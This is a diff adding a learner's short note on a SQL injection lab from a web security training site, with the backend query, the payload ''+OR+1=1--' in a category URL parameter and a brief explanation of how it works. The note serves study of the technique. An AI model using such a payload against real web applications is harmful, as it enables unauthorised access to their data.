@@ -1,0 +1,9 @@
+This is query:
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+so we need replace {'+or+1=1--} in 'Gifts':
+https://xxxxxxx.web-security-academy.net/filter?category='+OR+1=1--
+
+' It is to start our own queries
+Because 1=1 is always a true statement, it returns all products to us as requested
+And - which we put at the end, is for commenting
